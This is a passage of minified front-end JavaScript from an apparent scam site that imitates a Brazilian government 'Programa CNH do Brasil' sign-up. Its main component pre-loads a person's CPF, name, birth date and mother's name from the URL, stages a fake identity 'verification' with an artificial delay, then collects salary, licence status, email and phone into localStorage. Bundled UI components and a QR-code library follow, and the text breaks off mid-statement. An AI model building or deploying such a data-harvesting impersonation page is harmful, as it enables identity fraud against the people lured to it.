/+VJxZRRZlqSkKiws0WFxUyCwsKiMy7hUVFhIaCrNQsKkTIsLivwKKigsj8XYlwt/WKi2N4d//uQRCSAAjURNIHpMZBGYiaQPSYyAAABLAAAAAAAACWAAAAApUF/Mg+0aohSIRobBAsMlO//Kk4soosy1JSFRYWaLC4qZBYWFRGZdwqKiwkNBVmoWFSJkWFxX4FFRQWR+LsS4W/rFRb/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////VEFHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAU291bmRib3kuZGUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMjAwNGh0dHA6Ly93d3cuc291bmRib3kuZGUAAAAAAAAAACU=").play().catch(console.error)
  };

function g3() {
  const [, e] = In(), [t, n] = x.useState("name"), [r, s] = x.useState(null), [o, i] = x.useState(""), [a, c] = x.useState("idle"), [u, d] = x.useState(""), [f, h] = x.useState(""), [y, w] = x.useState(!1), [v, S] = x.useState(""), p = new URLSearchParams(window.location.search).get("data"), m = x.useMemo(() => {
    if (!p) return null;
    try {
      return JSON.parse(decodeURIComponent(p))
    } catch {
      return null
    }
  }, [p]), b = (m == null ? void 0 : m.manualEntry) === !0, C = m ? fp(m.data_nascimento) : "", j = !b && (m == null ? void 0 : m.nome_mae) && m.nome_mae.trim() !== "", A = x.useMemo(() => !m || b ? [] : Bc(m.nome, "name"), [m == null ? void 0 : m.nome, b]), P = x.useMemo(() => !m || b ? [] : Bc(C, "date"), [C, b]), M = x.useMemo(() => !m || !j ? [] : Bc(m.nome_mae, "mother"), [m == null ? void 0 : m.nome_mae, j]), _ = ["Desempregado(a)", "Até R$ 2.640 (até 2 salários mínimos)", "De R$ 2.641 a R$ 6.600 (2 a 5 salários mínimos)", "De R$ 6.601 a R$ 13.200 (5 a 10 salários mínimos)", "Acima de R$ 13.200 (mais de 10 salários mínimos)"], G = ["Não possuo CNH", "Possuo CNH categoria A (moto)", "Possuo CNH categoria B (carro)", "Possuo CNH categoria AB ou superior"], I = R => {
    const L = R.replace(/\D/g, "");
    return L.length <= 2 ? L : L.length <= 7 ? `(${L.slice(0, 2)}) ${L.slice(2)}` : `(${L.slice(0, 2)}) ${L.slice(2, 7)}-${L.slice(7, 11)}`
  }, $ = R => {
    h(I(R.target.value))
  }, U = R => {
    const L = R.target.value;
    d(L), w(L.includes("@") && !L.includes("."))
  }, te = R => {
    const L = u.split("@")[0];
    d(L + R), w(!1)
  };
  if (!m) return l.jsxs("div", {
    children: [l.jsx(rt, {}), l.jsx("div", {
      className: "container",
      children: l.jsx("main", {
        id: "main-signin",
        children: l.jsxs("div", {
          className: "card",
          style: {
            maxWidth: "600px",
            alignItems: "flex-start"
          },
          children: [l.jsx("h3", {
            children: "Dados não encontrados"
          }), l.jsx("p", {
            children: "Não foram encontrados dados para verificação."
          }), l.jsx("div", {
            className: "button-panel",
            children: l.jsx("button", {
              type: "button",
              onClick: () => e("/"),
              className: "button-continuar",
              children: "Voltar"
            })
          })]
        })
      })
    })]
  });
  const re = async () => {
    if (b && t === "name" && (!v || v.trim().length < 3)) {
      s("Por favor, insira seu nome completo");
      return
    }
    if (t === "email" && !u) {
      s("Por favor, insira seu email");
      return
    }
    if (t === "phone" && !f) {
      s("Por favor, insira seu telefone");
      return
    }
    if (!b && t !== "email" && t !== "phone" && !o) {
      s("Por favor, selecione uma opção");
      return
    }
    c("loading"), await new Promise(L => setTimeout(L, 3e3));
    let R = !1;
    switch (t) {
      case "name":
        b ? R = v.trim().length >= 3 : R = o === m.nome;
        break;
      case "birth":
        R = o === C;
        break;
      case "mother":
        R = o === m.nome_mae;
        break;
      case "salary":
        R = o !== "";
        break;
      case "flights":
        R = o !== "";
        break;
      case "email":
        R = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(u);
        break;
      case "phone":
        R = f.replace(/\D/g, "").length >= 10;
        break
    }
    R ? (c("success"), p3(), setTimeout(() => {
      if (s(null), c("idle"), t === "phone") {
        const L = localStorage.getItem("userData"),
          J = L ? JSON.parse(L) : {},
          oe = b ? {
            ...m,
            nome: v.trim()
          } : m;
        localStorage.setItem("userData", JSON.stringify({
          ...J,
          ...oe,
          email: u,
          phone: f
        }));
        const ze = b ? encodeURIComponent(JSON.stringify(oe)) : p;
        e(`/saiba-mais?data=${ze}`)
      } else {
        if (t === "name" && b) {
          const L = localStorage.getItem("userData"),
            J = L ? JSON.parse(L) : {};
          localStorage.setItem("userData", JSON.stringify({
            ...J,
            cpf: m.cpf,
            nome: v.trim()
          }))
        }
        if (t === "salary" || t === "flights") {
          const L = localStorage.getItem("userData"),
            J = L ? JSON.parse(L) : {},
            oe = t === "salary" ? {
              salaryRange: o
            } : {
              flightFrequency: o
            };
          localStorage.setItem("userData", JSON.stringify({
            ...J,
            ...oe
          }))
        }
        n(t === "name" ? b ? "salary" : "birth" : t === "birth" ? j ? "mother" : "salary" : t === "mother" ? "salary" : t === "salary" ? "flights" : t === "flights" ? "email" : "phone"), i("")
      }
    }, 1e3)) : (s(t === "email" ? "Email inválido" : t === "phone" ? "Telefone inválido" : "Dados incorretos. Por favor, verifique sua resposta."), c("idle"))
  }, D = (() => {
    const R = L => {
      if (b) switch (L) {
        case "name":
          return 1;
        case "salary":
          return 2;
        case "flights":
          return 3;
        case "email":
          return 4;
        case "phone":
          return 5;
        default:
          return 1
      }
      if (!j) switch (L) {
        case "name":
          return 1;
        case "birth":
          return 2;
        case "salary":
          return 3;
        case "flights":
          return 4;
        case "email":
          return 5;
        case "phone":
          return 6;
        default:
          return 1
      }
      switch (L) {
        case "name":
          return 1;
        case "birth":
          return 2;
        case "mother":
          return 3;
        case "salary":
          return 4;
        case "flights":
          return 5;
        case "email":
          return 6;
        case "phone":
          return 7;
        default:
          return 1
      }
    };
    switch (t) {
      case "name":
        return {
          title: b ? "Digite seu nome completo" : "Qual é seu nome completo?", options: A, type: "name", number: R("name")
        };
      case "birth":
        return {
          title: "Qual é sua data de nascimento?", options: P, type: "birth", number: R("birth")
        };
      case "mother":
        return {
          title: "Qual é o nome da sua mãe?", options: M, type: "mother", number: R("mother")
        };
      case "salary":
        return {
          title: "Qual é sua faixa salarial atual?", options: _, type: "salary", number: R("salary")
        };
      case "flights":
        return {
          title: "Qual sua situação atual de habilitação?", options: G, type: "flights", number: R("flights")
        };
      case "email":
        return {
          title: "Qual é o seu email?", type: "email", number: R("email")
        };
      case "phone":
        return {
          title: "Qual é o seu telefone?", type: "phone", number: R("phone")
        }
    }
  })();
  return l.jsxs("div", {
    children: [l.jsx(rt, {}), l.jsx("div", {
      className: "container",
      children: l.jsx("main", {
        id: "main-signin",
        style: {
          width: "100%",
          maxWidth: "800px",
          margin: "0 auto"
        },
        children: l.jsxs("div", {
          className: "card",
          style: {
            width: "100%",
            alignItems: "flex-start",
            padding: "2rem"
          },
          children: [l.jsx("h3", {
            className: "text-center w-full text-lg font-bold mb-6",
            children: "Confirme seus dados para o cadastro no Programa CNH do Brasil"
          }), l.jsx("div", {
            className: "w-full",
            children: l.jsxs("div", {
              children: [l.jsxs("div", {
                className: "flex items-center gap-3 mb-4",
                children: [l.jsx("div", {
                  className: "flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium",
                  children: D.number
                }), l.jsx("p", {
                  className: "font-semibold text-base",
                  children: D.title
                })]
              }), l.jsxs("div", {
                className: "space-y-3 pl-4",
                children: [t === "name" && b && l.jsx("input", {
                  type: "text",
                  value: v,
                  onChange: R => {
                    S(R.target.value), s(null)
                  },
                  placeholder: "Digite seu nome completo",
                  className: "w-full p-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1351B4] text-lg"
                }), !b && (t === "name" || t === "birth" || t === "mother" || t === "salary" || t === "flights") && (D == null ? void 0 : D.options) && D.options.map((R, L) => l.jsx("div", {
                  className: `flex items-center w-full p-3 rounded-md transition-all cursor-pointer ${o === R ? "bg-[#1351B4] bg-opacity-10 border-2 border-[#1351B4]" : "bg-gray-50 hover:bg-gray-100"}`,
                  onClick: () => {
                    i(R), s(null)
                  },
                  children: l.jsx("label", {
                    htmlFor: `option-${L}`,
                    className: `flex-1 cursor-pointer ${o === R ? "text-[#1351B4] font-medium" : ""}`,
                    children: D.type === "birth" ? fp(R) : dp(R)
                  })
                }, L)), b && (t === "salary" || t === "flights") && (D == null ? void 0 : D.options) && D.options.map((R, L) => l.jsx("div", {
                  className: `flex items-center w-full p-3 rounded-md transition-all cursor-pointer ${o === R ? "bg-[#1351B4] bg-opacity-10 border-2 border-[#1351B4]" : "bg-gray-50 hover:bg-gray-100"}`,
                  onClick: () => {
                    i(R), s(null)
                  },
                  children: l.jsx("label", {
                    htmlFor: `option-${L}`,
                    className: `flex-1 cursor-pointer ${o === R ? "text-[#1351B4] font-medium" : ""}`,
                    children: dp(R)
                  })
                }, L)), t === "email" && l.jsxs("div", {
                  className: "relative",
                  children: [l.jsx("input", {
                    type: "email",
                    value: u,
                    onChange: U,
                    placeholder: "Digite seu email",
                    className: "w-full p-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1351B4] text-lg"
                  }), y && l.jsx("div", {
                    className: "absolute z-10 w-full mt-1 bg-white border border-gray-200 rounded-md shadow-lg",
                    children: m3.map((R, L) => l.jsxs("div", {
                      className: "p-3 hover:bg-gray-100 cursor-pointer text-lg",
                      onClick: () => te(R),
                      children: [u.split("@")[0], R]
                    }, L))
                  })]
                }), t === "phone" && l.jsx("input", {
                  type: "tel",
                  value: f,
                  onChange: $,
                  placeholder: "(11) 99999-9999",
                  className: "w-full p-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1351B4] text-lg"
                })]
              }), r && l.jsx("p", {
                className: "text-red-500 mt-4",
                children: r
              }), l.jsx("div", {
                className: "flex justify-center mt-6",
                children: l.jsxs("button", {
                  type: "button",
                  onClick: re,
                  disabled: a !== "idle",
                  className: "button-continuar flex items-center justify-center gap-2 min-w-[160px]",
                  children: [a === "loading" && l.jsx(vt, {
                    className: "h-4 w-4 animate-spin"
                  }), a === "success" && l.jsx(It, {
                    className: "h-4 w-4"
                  }), a === "loading" ? "Verificando" : a === "success" ? "Verificado" : "Confirmar"]
                })
              })]
            })
          })]
        })
      })
    })]
  })
}
const bn = x.forwardRef(({
  className: e,
  ...t
}, n) => l.jsx("div", {
  ref: n,
  className: Nt("rounded-lg border bg-card text-card-foreground shadow-sm", e),
  ...t
}));
bn.displayName = "Card";
const ci = x.forwardRef(({
  className: e,
  ...t
}, n) => l.jsx("div", {
  ref: n,
  className: Nt("flex flex-col space-y-1.5 p-6", e),
  ...t
}));
ci.displayName = "CardHeader";
const ui = x.forwardRef(({
  className: e,
  ...t
}, n) => l.jsx("h3", {
  ref: n,
  className: Nt("text-2xl font-semibold leading-none tracking-tight", e),
  ...t
}));
ui.displayName = "CardTitle";
const y3 = x.forwardRef(({
  className: e,
  ...t
}, n) => l.jsx("p", {
  ref: n,
  className: Nt("text-sm text-muted-foreground", e),
  ...t
}));
y3.displayName = "CardDescription";
const Sn = x.forwardRef(({
  className: e,
  ...t
}, n) => l.jsx("div", {
  ref: n,
  className: Nt("p-6 pt-0", e),
  ...t
}));
Sn.displayName = "CardContent";
const v3 = x.forwardRef(({
  className: e,
  ...t
}, n) => l.jsx("div", {
  ref: n,
  className: Nt("flex items-center p-6 pt-0", e),
  ...t
}));
v3.displayName = "CardFooter";
const x3 = zv("inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0", {
  variants: {
    variant: {
      default: "bg-primary text-primary-foreground hover:bg-primary/90",
      destructive: "bg-destructive text-destructive-foreground hover:bg-destructive/90",
      outline: "border border-input bg-background hover:bg-accent hover:text-accent-foreground",
      secondary: "bg-secondary text-secondary-foreground hover:bg-secondary/80",
      ghost: "hover:bg-accent hover:text-accent-foreground",
      link: "text-primary underline-offset-4 hover:underline"
    },
    size: {
      default: "h-10 px-4 py-2",
      sm: "h-9 rounded-md px-3",
      lg: "h-11 rounded-md px-8",
      icon: "h-10 w-10"
    }
  },
  defaultVariants: {
    variant: "default",
    size: "default"
  }
}),
  jn = x.forwardRef(({
    className: e,
    variant: t,
    size: n,
    asChild: r = !1,
    ...s
  }, o) => {
    const i = r ? li : "button";
    return l.jsx(i, {
      className: Nt(x3({
        variant: t,
        size: n,
        className: e
      })),
      ref: o,
      ...s
    })
  });
jn.displayName = "Button";
var Zs = {},
  w3 = function () {
    return typeof Promise == "function" && Promise.prototype && Promise.prototype.then
  },
  wx = {},
  jt = {};
let If;
const b3 = [0, 26, 44, 70, 100, 134, 172, 196, 242, 292, 346, 404, 466, 532, 581, 655, 733, 815, 901, 991, 1085, 1156, 1258, 1364, 1474, 1588, 1706, 1828, 1921, 2051, 2185, 2323, 2465, 2611, 2761, 2876, 3034, 3196, 3362, 3532, 3706];
jt.getSymbolSize = function (t) {
  if (!t) throw new Error('"version" cannot be null or undefined');
  if (t < 1 || t > 40) throw new Error('"version" should be in range from 1 to 40');
  return t * 4 + 17
};
jt.getSymbolTotalCodewords = function (t) {
  return b3[t]
};
jt.getBCHDigit = function (e) {
  let t = 0;
  for (; e !== 0;) t++, e >>>= 1;
  return t
};
jt.setToSJISFunction = function (t) {
  if (typeof t != "function") throw new Error('"toSJISFunc" is not a valid function.');
  If = t
};
jt.isKanjiModeEnabled = function () {
  return typeof If < "u"
};
jt.toSJIS = function (t) {
  return If(t)
};
var Bl = {};
(function (e) {
  e.L = {
    bit: 1
  }, e.M = {
    bit: 0
  }, e.Q = {
    bit: 3
  }, e.H = {
    bit: 2
  };

  function t(n) {
    if (typeof n != "string") throw new Error("Param is not a string");
    switch (n.toLowerCase()) {
      case "l":
      case "low":
        return e.L;
      case "m":
      case "medium":
        return e.M;
      case "q":
      case "quartile":
        return e.Q;
      case "h":
      case "high":
        return e.H;
      default:
        throw new Error("Unknown EC Level: " + n)
    }
  }
  e.isValid = function (r) {
    return r && typeof r.bit < "u" && r.bit >= 0 && r.bit < 4
  }, e.from = function (r, s) {
    if (e.isValid(r)) return r;
    try {
      return t(r)
    } catch {
      return s
    }
  }
})(Bl);

function bx() {
  this.buffer = [], this.length = 0
}
bx.prototype = {
  get: function (e) {
    const t = Math.floor(e / 8);
    return (this.buffer[t] >>> 7 - e % 8 & 1) === 1
  },
  put: function (e, t) {
    for (let n = 0; n < t; n++) this.putBit((e >>> t - n - 1 & 1) === 1)
  },
  getLengthInBits: function () {
    return this.length
  },
  putBit: function (e) {
    const t = Math.floor(this.length / 8);
    this.buffer.length <= t && this.buffer.push(0), e && (this.buffer[t] |= 128 >>> this.length % 8), this.length++
  }
};
var S3 = bx;

function ji(e) {
  if (!e || e < 1) throw new Error("BitMatrix size must be defined and greater than 0");
  this.size = e, this.data = new Uint8Array(e * e), this.reservedBit = new Uint8Array(e * e)
}
ji.prototype.set = function (e, t, n, r) {
  const s = e * this.size + t;
  this.data[s] = n, r && (this.reservedBit[s] = !0)
};
ji.prototype.get = function (e, t) {
  return this.data[e * this.size + t]
};
ji.prototype.xor = function (e, t, n) {
  this.data[e * this.size + t] ^= n
};
ji.prototype.isReserved = function (e, t) {
  return this.reservedBit[e * this.size + t]
};
var C3 = ji,
  Sx = {};
(function (e) {
  const t = jt.getSymbolSize;
  e.getRowColCoords = function (r) {
    if (r === 1) return [];
    const s = Math.floor(r / 7) + 2,
      o = t(r),
      i = o === 145 ? 26 : Math.ceil((o - 13) / (2 * s - 2)) * 2,
      a = [o - 7];
    for (let c = 1; c < s - 1; c++) a[c] = a[c - 1] - i;
    return a.push(6), a.reverse()
  }, e.getPositions = function (r) {
    const s = [],
      o = e.getRowColCoords(r),
      i = o.length;
    for (let a = 0; a < i; a++)
      for (let c = 0; c < i; c++) a === 0 && c === 0 || a === 0 && c === i - 1 || a === i - 1 && c === 0 || s.push([o[a], o[c]]);
    return s
  }
})(Sx);
var Cx = {};
const N3 = jt.getSymbolSize,
  hp = 7;
Cx.getPositions = function (t) {
  const n = N3(t);
  return [
    [0, 0],
    [n - hp, 0],
    [0, n - hp]
  ]
};
var Nx = {};
(function (e) {
  e.Patterns = {
    PATTERN000: 0,
    PATTERN001: 1,
    PATTERN010: 2,
    PATTERN011: 3,
    PATTERN100: 4,
    PATTERN101: 5,
    PATTERN110: 6,
    PATTERN111: 7
  };
  const t = {
    N1: 3,
    N2: 3,
    N3: 40,
    N4: 10
  };
  e.isValid = function (s) {
    return s != null && s !== "" && !isNaN(s) && s >= 0 && s <= 7
  }, e.from = function (s) {
    return e.isValid(s) ? parseInt(s, 10) : void 0
  }, e.getPenaltyN1 = function (s) {
    const o = s.size;
    let i = 0,
      a = 0,
      c = 0,
      u = null,
      d = null;
    for (let f = 0; f < o; f++) {
      a = c = 0, u = d = null;
      for (let h = 0; h < o; h++) {
        let y = s.get(f, h);
        y === u ? a++ : (a >= 5 && (i += t.N1 + (a - 5)), u = y, a = 1), y = s.get(h, f), y === d ? c++ : (c >= 5 && (i += t.N1 + (c - 5)), d = y, c = 1)
      }
      a >= 5 && (i += t.N1 + (a - 5)), c >= 5 && (i += t.N1 + (c - 5))
    }
    return i
  }, e.getPenaltyN2 = function (s) {
    const o = s.size;
    let i = 0;
    for (let a = 0; a < o - 1; a++)
      for (let c = 0; c < o - 1; c++) {
        const u = s.get(a, c) + s.get(a, c + 1) + s.get(a + 1, c) + s.get(a + 1, c + 1);
        (u === 4 || u === 0) && i++
      }
    return i * t.N2
  }, e.getPenaltyN3 = function (s) {
    const o = s.size;
    let i = 0,
      a = 0,
      c = 0;
    for (let u = 0; u < o; u++) {
      a = c = 0;
      for (let d = 0; d < o; d++) a = a << 1 & 2047 | s.get(u, d), d >= 10 && (a === 1488 || a === 93) && i++, c = c << 1 & 2047 | s.get(d, u), d >= 10 && (c === 1488 || c === 93) && i++
    }
    return i * t.N3
  }, e.getPenaltyN4 = function (s) {
    let o = 0;
    const i = s.data.length;
    for (let c = 0; c < i; c++) o += s.data[c];
    return Math.abs(Math.ceil(o * 100 / i / 5) - 10) * t.N4
  };

  function n(r, s, o) {
    switch (r) {
      case e.Patterns.PATTERN000:
        return (s + o) % 2 === 0;
      case e.Patterns.PATTERN001:
        return s % 2 === 0;
      case e.Patterns.PATTERN010:
        return o % 3 === 0;
      case e.Patterns.PATTERN011:
        return (s + o) % 3 === 0;
      case e.Patterns.PATTERN100:
        return (Math.floor(s / 2) + Math.floor(o / 3)) % 2 === 0;
      case e.Patterns.PATTERN101:
        return s * o % 2 + s * o % 3 === 0;
      case e.Patterns.PATTERN110:
        return (s * o % 2 + s * o % 3) % 2 === 0;
      case e.Patterns.PATTERN111:
        return (s * o % 3 + (s + o) % 2) % 2 === 0;
      default:
        throw new Error("bad maskPattern:" + r)
    }
  }
  e.applyMask = function (s, o) {
    const i = o.size;
    for (let a = 0; a < i; a++)
      for (let c = 0; c < i; c++) o.isReserved(c, a) || o.xor(c, a, n(s, c, a))
  }, e.getBestMask = function (s, o) {
    const i = Object.keys(e.Patterns).length;
    let a = 0,
      c = 1 / 0;
    for (let u = 0; u < i; u++) {
      o(u), e.applyMask(u, s);
      const d = e.getPenaltyN1(s) + e.getPenaltyN2(s) + e.getPenaltyN3(s) + e.getPenaltyN4(s);
      e.applyMask(u, s), d < c && (c = d, a = u)
    }
    return a
  }
})(Nx);
var zl = {};
const er = Bl,
  oa = [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 2, 2, 1, 2, 2, 4, 1, 2, 4, 4, 2, 4, 4, 4, 2, 4, 6, 5, 2, 4, 6, 6, 2, 5, 8, 8, 4, 5, 8, 8, 4, 5, 8, 11, 4, 8, 10, 11, 4, 9, 12, 16, 4, 9, 16, 16, 6, 10, 12, 18, 6, 10, 17, 16, 6, 11, 16, 19, 6, 13, 18, 21, 7, 14, 21, 25, 8, 16, 20, 25, 8, 17, 23, 25, 9, 17, 23, 34, 9, 18, 25, 30, 10, 20, 27, 32, 12, 21, 29, 35, 12, 23, 34, 37, 12, 25, 34, 40, 13, 26, 35, 42, 14, 28, 38, 45, 15, 29, 40, 48, 16, 31, 43, 51, 17, 33, 45, 54, 18, 35, 48, 57, 19, 37, 51, 60, 19, 38, 53, 63, 20, 40, 56, 66, 21, 43, 59, 70, 22, 45, 62, 74, 24, 47, 65, 77, 25, 49, 68, 81],
  ia = [7, 10, 13, 17, 10, 16, 22, 28, 15, 26, 36, 44, 20, 36, 52, 64, 26, 48, 72, 88, 36, 64, 96, 112, 40, 72, 108, 130, 48, 88, 132, 156, 60, 110, 160, 192, 72, 130, 192, 224, 80, 150, 224, 264, 96, 176, 260, 308, 104, 198, 288, 352, 120, 216, 320, 384, 132, 240, 360, 432, 144, 280, 408, 480, 168, 308, 448, 532, 180, 338, 504, 588, 196, 364, 546, 650, 224, 416, 600, 700, 224, 442, 644, 750, 252, 476, 690, 816, 270, 504, 750, 900, 300, 560, 810, 960, 312, 588, 870, 1050, 336, 644, 952, 1110, 360, 700, 1020, 1200, 390, 728, 1050, 1260, 420, 784, 1140, 1350, 450, 812, 1200, 1440, 480, 868, 1290, 1530, 510, 924, 1350, 1620, 540, 980, 1440, 1710, 570, 1036, 1530, 1800, 570, 1064, 1590, 1890, 600, 1120, 1680, 1980, 630, 1204, 1770, 2100, 660, 1260, 1860, 2220, 720, 1316, 1950, 2310, 750, 1372, 2040, 2430];
zl.getBlocksCount = function (t, n) {
  switch (n) {
    case er.L:
      return oa[(t - 1) * 4 + 0];
    case er.M:
      return oa[(t - 1) * 4 + 1];
    case er.Q:
      return oa[(t - 1) * 4 + 2];
    case er.H:
      return oa[(t - 1) * 4 + 3];
    default:
      return
  }
};
zl.getTotalCodewordsCount = function (t, n) {
  switch (n) {
    case er.L:
      return ia[(t - 1) * 4 + 0];
    case er.M:
      return ia[(t - 1) * 4 + 1];
    case er.Q:
      return ia[(t - 1) * 4 + 2];
    case er.H:
      return ia[(t - 1) * 4 + 3];
    default:
      return
  }
};
var jx = {},
  Ul = {};
const Vo = new Uint8Array(512),
  ol = new Uint8Array(256);
(function () {
  let t = 1;
  for (let n = 0; n < 255; n++) Vo[n] = t, ol[t] = n, t <<= 1, t & 256 && (t ^= 285);
  for (let n = 255; n < 512; n++) Vo[n] = Vo[n - 255]
})();
Ul.log = function (t) {
  if (t < 1) throw new Error("log(" + t + ")");
  return ol[t]
};
Ul.exp = function (t) {
  return Vo[t]
};
Ul.mul = function (t, n) {
  return t === 0 || n === 0 ? 0 : Vo[ol[t] + ol[n]]
};
(function (e) {
  const t = Ul;
  e.mul = function (r, s) {
    const o = new Uint8Array(r.length + s.length - 1);
    for (let i = 0; i < r.length; i++)
      for (let a = 0; a < s.length; a++) o[i + a] ^= t.mul(r[i], s[a]);
    return o
  }, e.mod = function (r, s) {
    let o = new Uint8Array(r);
    for (; o.length - s.length >= 0;) {
      const i = o[0];
      for (let c = 0; c < s.length; c++) o[c] ^= t.mul(s[c], i);
      let a = 0;
      for (; a < o.length && o[a] === 0;) a++;
      o = o.slice(a)
    }
    return o
  }, e.generateECPolynomial = function (r) {
    let s = new Uint8Array([1]);
    for (let o = 0; o < r; o++) s = e.mul(s, new Uint8Array([1, t.exp(o)]));
    return s
  }
})(jx);
const Ax = jx;

function Lf(e) {
  this.genPoly = void 0, this.degree = e, this.degree && this.initialize(this.degree)
}
Lf.prototype.initialize = function (t) {
  this.degree = t, this.genPoly = Ax.generateECPolynomial(this.degree)
};
Lf.prototype.encode = function (t) {
  if (!this.genPoly) throw new Error("Encoder not initialized");
  const n = new Uint8Array(t.length + this.degree);
  n.set(t);
  const r = Ax.mod(n, this.genPoly),
    s = this.degree - r.length;
  if (s > 0) {
    const o = new Uint8Array(this.degree);
    return o.set(r, s), o
  }
  return r
};
var j3 = Lf,
  Px = {},
  vr = {},
  Of = {};
Of.isValid = function (t) {
  return !isNaN(t) && t >= 1 && t <= 40
};
var un = {};
const Ex = "[0-9]+",
  A3 = "[A-Z $%*+\\-./:]+";
let di = "(?:[u3000-u303F]|[u3040-u309F]|[u30A0-u30FF]|[uFF00-uFFEF]|[u4E00-u9FAF]|[u2605-u2606]|[u2190-u2195]|u203B|[u2010u2015u2018u2019u2025u2026u201Cu201Du2225u2260]|[u0391-u0451]|[u00A7u00A8u00B1u00B4u00D7u00F7])+";
di = di.replace(/u/g, "\\u");
const P3 = "(?:(?![A-Z0-9 $%*+\\-./:]|" + di + `)(?:.|[\r
]))+`;
un.KANJI = new RegExp(di, "g");
un.BYTE_KANJI = new RegExp("[^A-Z0-9 $%*+\\-./:]+", "g");
un.BYTE = new RegExp(P3, "g");
un.NUMERIC = new RegExp(Ex, "g");
un.ALPHANUMERIC = new RegExp(A3, "g");
const E3 = new RegExp("^" + di + "$"),
  T3 = new RegExp("^" + Ex + "$"),
  k3 = new RegExp("^[A-Z0-9 $%*+\\-./:]+$");
un.testKanji = function (t) {
  return E3.test(t)
};
un.testNumeric = function (t) {
  return T3.test(t)
};
un.testAlphanumeric = function (t) {
  return k3.test(t)
};
(function (e) {
  const t = Of,
    n = un;
  e.NUMERIC = {
    id: "Numeric",
    bit: 1,
    ccBits: [10, 12, 14]
  }, e.ALPHANUMERIC = {
    id: "Alphanumeric",
    bit: 2,
    ccBits: [9, 11, 13]
  }, e.BYTE = {
    id: "Byte",
    bit: 4,
    ccBits: [8, 16, 16]
  }, e.KANJI = {
    id: "Kanji",
    bit: 8,
    ccBits: [8, 10, 12]
  }, e.MIXED = {
    bit: -1
  }, e.getCharCountIndicator = function (o, i) {
    if (!o.ccBits) throw new Error("Invalid mode: " + o);
    if (!t.isValid(i)) throw new Error("Invalid version: " + i);
    return i >= 1 && i < 10 ? o.ccBits[0] : i < 27 ? o.ccBits[1] : o.ccBits[2]
  }, e.getBestModeForData = function (o) {
    return n.testNumeric(o) ? e.NUMERIC : n.testAlphanumeric(o) ? e.ALPHANUMERIC : n.testKanji(o) ? e.KANJI : e.BYTE
  }, e.toString = function (o) {
    if (o && o.id) return o.id;
    throw new Error("Invalid mode")
  }, e.isValid = function (o) {
    return o && o.bit && o.ccBits
  };

  function r(s) {
    if (typeof s != "string") throw new Error("Param is not a string");
    switch (s.toLowerCase()) {
      case "numeric":
        return e.NUMERIC;
      case "alphanumeric":
        return e.ALPHANUMERIC;
      case "kanji":
        return e.KANJI;
      case "byte":
        return e.BYTE;
      default:
        throw new Error("Unknown mode: " + s)
    }
  }
  e.from = function (o, i) {
    if (e.isValid(o)) return o;
    try {
      return r(o)
    } catch {
      return i
    }
  }
})(vr);
(function (e) {
  const t = jt,
    n = zl,
    r = Bl,
    s = vr,
    o = Of,
    i = 7973,
    a = t.getBCHDigit(i);

  function c(h, y, w) {
    for (let v = 1; v <= 40; v++)
      if (y <= e.getCapacity(v, w, h)) return v
  }

  function u(h, y) {
    return s.getCharCountIndicator(h, y) + 4
  }

  function d(h, y) {
    let w = 0;
    return h.forEach(function (v) {
      const S = u(v.mode, y);
      w += S + v.getBitsLength()
    }), w
  }

  function f(h, y) {
    for (let w = 1; w <= 40; w++)
      if (d(h, w) <= e.getCapacity(w, y, s.MIXED)) return w
  }
  e.from = function (y, w) {
    return o.isValid(y) ? parseInt(y, 10) : w
  }, e.getCapacity = function (y, w, v) {
    if (!o.isValid(y)) throw new Error("Invalid QR Code version");
    typeof v > "u" && (v = s.BYTE);
    const S = t.getSymbolTotalCodewords(y),
      g = n.getTotalCodewordsCount(y, w),
      p = (S - g) * 8;
    if (v === s.MIXED) return p;
    const m = p - u(v, y);
    switch (v) {
      case s.NUMERIC:
        return Math.floor(m / 10 * 3);
      case s.ALPHANUMERIC:
        return Math.floor(m / 11 * 2);
      case s.KANJI:
        return Math.floor(m / 13);
      case s.BYTE:
      default:
        return Math.floor(m / 8)
    }
  }, e.getBestVersionForData = function (y, w) {
    let v;
    const S = r.from(w, r.M);
    if (Array.isArray(y)) {
      if (y.length > 1) return f(y, S);
      if (y.length === 0) return 1;
      v = y[0]
    } else v = y;
    return c(v.mode, v.getLength(), S)
  }, e.getEncodedBits = function (y) {
    if (!o.isValid(y) || y < 7) throw new Error("Invalid QR Code version");
    let w = y << 12;
    for (; t.getBCHDigit(w) - a >= 0;) w ^= i << t.getBCHDigit(w) - a;
    return y << 12 | w
  }
})(Px);
var Tx = {};
const id = jt,
  kx = 1335,
  R3 = 21522,
  mp = id.getBCHDigit(kx);
Tx.getEncodedBits = function (t, n) {
  const r = t.bit << 3 | n;
  let s = r << 10;
  for (; id.getBCHDigit(s) - mp >= 0;) s ^= kx << id.getBCHDigit(s) - mp;
  return (r << 10 | s) ^ R3
};
var Rx = {};
const D3 = vr;

function Us(e) {
  this.mode = D3.NUMERIC, this.data = e.toString()
}
Us.getBitsLength = function (t) {
  return 10 * Math.floor(t / 3) + (t % 3 ? t % 3 * 3 + 1 : 0)
};
Us.prototype.getLength = function () {
  return this.data.length
};
Us.prototype.getBitsLength = function () {
  return Us.getBitsLength(this.data.length)
};
Us.prototype.write = function (t) {
  let n, r, s;
  for (n = 0; n + 3 <= this.data.length; n += 3) r = this.data.substr(n, 3), s = parseInt(r, 10), t.put(s, 10);
  const o = this.data.length - n;
  o > 0 && (r = this.data.substr(n), s = parseInt(r, 10), t.put(s, o * 3 + 1))
};
var M3 = Us;
const _3 = vr,
